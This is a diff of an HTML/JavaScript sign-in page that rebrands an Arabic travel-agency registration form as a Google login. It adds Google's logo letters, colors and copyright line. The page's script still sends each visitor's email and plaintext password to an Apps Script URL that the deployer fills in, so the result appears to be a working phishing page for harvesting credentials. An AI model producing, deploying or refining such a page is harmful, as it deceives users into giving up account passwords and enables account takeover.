@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
+<title>Sign In</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 :root{
@@ -15,9 +15,9 @@
   --g-border:#dadce0;
   --g-bg:#fff;
 }
-*{box-sizing:border-box; font-family:'Roboto', 'Cairo', sans-serif}
+*{box-sizing:border-box; font-family:'Roboto', sans-serif}
 body{
-  background:#fff; /* خلفية بيضا */
+  background:#fff; /* White background */
   margin:0; 
   display:flex; 
   justify-content:center; 
@@ -35,13 +35,12 @@ body{
 }
 .logo{text-align:center; margin-bottom:30px}
 .logo h2{font-size:28px; margin:0; font-weight:500; letter-spacing:-1px}
-.logo .b1{color:var(--g-blue)}
-.logo .b2{color:var(--g-red)}
-.logo .b3{color:var(--g-yellow)}
-.logo .b4{color:var(--g-blue)}
-.logo .b5{color:var(--g-green)}
-.logo .b6{color:var(--g-red)}
-.logo .b7{color:var(--g-gray)}
+.logo .b1{color:var(--g-blue)}   /* G */
+.logo .b2{color:var(--g-red)}    /* o */
+.logo .b3{color:var(--g-yellow)} /* o */
+.logo .b4{color:var(--g-blue)}   /* g */
+.logo .b5{color:var(--g-green)}  /* l */
+.logo .b6{color:var(--g-red)}    /* e */
 
 .form-group{position:relative; margin-bottom:24px}
 .form-group input{
@@ -53,13 +52,13 @@ body{
   outline:none;
   color:#202124
 }
-/* اول حقل ازرق - تاني حقل احمر */
+/* First input blue - Second input red */
 .form-group:nth-child(1) input:focus{border:2px solid var(--g-blue)}
 .form-group:nth-child(2) input:focus{border:2px solid var(--g-red)}
 
 .form-group label{
   position:absolute;
-  top:13px; right:15px;
+  top:13px; left:15px;
   color:var(--g-gray); font-size:16px;
   pointer-events:none;
   transition:0.15s;
@@ -75,7 +74,7 @@ body{
 .btn{
   width:100%; 
   padding:10px 24px; 
-  background:var(--g-blue); /* الزرار ازرق */
+  background:var(--g-blue); /* Google Blue */
   color:white; 
   border:none; 
   border-radius:4px;
@@ -92,19 +91,20 @@ body{
   font-size:12px; 
   color:var(--g-gray)
 }
-/* اسم الشركة ملون */
+/* Company name colored */
 .footer-text .c1{color:var(--g-blue)}
 .footer-text .c2{color:var(--g-red)}
 .footer-text .c3{color:var(--g-yellow)}
-.footer-text .c4{color:var(--g-green)}
-.footer-text .c5{color:var(--g-gray)}
+.footer-text .c4{color:var(--g-blue)}
+.footer-text .c5{color:var(--g-green)}
+.footer-text .c6{color:var(--g-red)}
 .hidden{display:none}
 .msg{margin-top:15px; padding:12px; border-radius:4px; text-align:center; font-size:14px; font-weight:600; display:none}
 .msg.show{display:block}
-.success{color:var(--g-green)} /* اخضر */
-.error{color:var(--g-red)} /* احمر */
-.info{color:var(--g-blue)} /* ازرق */
-.warning{color:var(--g-yellow)} /* اصفر */
+.success{color:var(--g-green)} /* Green */
+.error{color:var(--g-red)} /* Red */
+.info{color:var(--g-blue)} /* Blue */
+.warning{color:var(--g-yellow)} /* Yellow */
 </style>
 </head>
 <body>
@@ -112,53 +112,49 @@ body{
 <div class="login-box">
   <div class="logo">
     <h2>
-      <span class="b1">أ</span>
-      <span class="b2">ب</span>
-      <span class="b3">و</span>
-      <span class="b4"> </span>
-      <span class="b4">أ</span>
-      <span class="b5">و</span>
-      <span class="b6">ي</span>
-      <span class="b7">س</span>
-      <span style="font-size:16px; font-weight:400; color:#202124;"> للسفر والسياحة</span>
+      <span class="b1">G</span>
+      <span class="b2">o</span>
+      <span class="b3">o</span>
+      <span class="b4">g</span>
+      <span class="b5">l</span>
+      <span class="b6">e</span>
     </h2>
   </div>
 
-  <!-- فورم التسجيل -->
+  <!-- Register Form -->
   <form id="regForm">
     <div class="form-group">
       <input type="email" id="regEmail" placeholder=" " required>
-      <label>البريد الإلكتروني</label>
+      <label>Email</label>
     </div>
     <div class="form-group">
       <input type="password" id="regPassword" placeholder=" " required>
-      <label>كلمة المرور</label>
+      <label>Password</label>
     </div>
-    <button type="submit" class="btn" id="regBtn">التالي</button>
+    <button type="submit" class="btn" id="regBtn">Next</button>
     <div id="regMsg" class="msg"></div>
   </form>
 
-  <!-- فورم التحقق -->
+  <!-- Verification Form -->
   <form id="verifyForm" class="hidden">
     <div class="form-group">
       <input type="text" id="verifyCode" placeholder=" " maxlength="6" required>
-      <label>رمز التحقق</label>
+      <label>Verification Code</label>
     </div>
     <input type="hidden" id="verifyEmail">
-    <button type="submit" class="btn">تأكيد</button>
+    <button type="submit" class="btn">Verify</button>
     <div id="verifyMsg" class="msg"></div>
   </form>
 
   <p class="footer-text">
     © 2026 
-    <span class="c1">أ</span><span class="c2">ب</span><span class="c3">و</span> 
-    <span class="c4">أ</span><span class="c2">و</span><span class="c1">ي</span><span class="c5">س</span> 
-    للسفر والسياحة
+    <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span>
+    <span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
   </p>
 </div>
 
 <script>
-const SCRIPT_URL = 'https://script.google.com/macros/s/XXXXX/exec'; // <-- حط الرابط
+const SCRIPT_URL = 'https://script.google.com/macros/s/XXXXX/exec'; // <-- Put your Apps Script URL
 
 function showMsg(id, text, type){
   const el = document.getElementById(id);
@@ -166,17 +162,17 @@ function showMsg(id, text, type){
   el.className = 'msg show ' + type;
 }
 
-// التسجيل
+// Register
 document.getElementById('regForm').addEventListener('submit', e=>{
   e.preventDefault();
   const btn = document.getElementById('regBtn');
-  btn.disabled = true; btn.innerText = 'جاري الإرسال...';
-  showMsg('regMsg', '⏳ جاري ارسال الكود...', 'info');
+  btn.disabled = true; btn.innerText = 'Sending...';
+  showMsg('regMsg', '⏳ Sending code...', 'info');
   const code = Math.floor(100000 + Math.random() * 900000);
   
   const data = {
     action: "register",
-    name: "بدون اسم",
+    name: "No Name",
     email: regEmail.value, 
     password: regPassword.value, 
     code: code
@@ -188,21 +184,21 @@ document.getElementById('regForm').addEventListener('submit', e=>{
       verifyEmail.value = regEmail.value;
       document.getElementById('regForm').classList.add('hidden');
       document.getElementById('verifyForm').classList.remove('hidden');
-      showMsg('verifyMsg', '✅ تم ارسال كود التحقق', 'success');
+      showMsg('verifyMsg', '✅ Verification code sent', 'success');
     } else { showMsg('regMsg','❌ '+res.error,'error') }
-  }).finally(()=>{btn.disabled=false; btn.innerText='التالي'})
+  }).finally(()=>{btn.disabled=false; btn.innerText='Next'})
 });
 
-// التحقق
+// Verify
 document.getElementById('verifyForm').addEventListener('submit', e=>{
   e.preventDefault();
-  showMsg('verifyMsg', '⏳ جاري التأكيد...', 'warning');
+  showMsg('verifyMsg', '⏳ Verifying...', 'warning');
   const data = {action:"verify", email:verifyEmail.value, code:verifyCode.value};
   fetch(SCRIPT_URL, {method:'POST', body:JSON.stringify(data)})
 .then(res=>res.json()).then(res=>{
     if(res.result==="success"){
-      showMsg('verifyMsg','✅ تم تأكيد ايميلك بنجاح','success');
-    } else { showMsg('verifyMsg','❌ الكود غير صحيح','error') }
+      showMsg('verifyMsg','✅ Email verified successfully','success');
+    } else { showMsg('verifyMsg','❌ Invalid code','error') }
   })
 });
 </script>
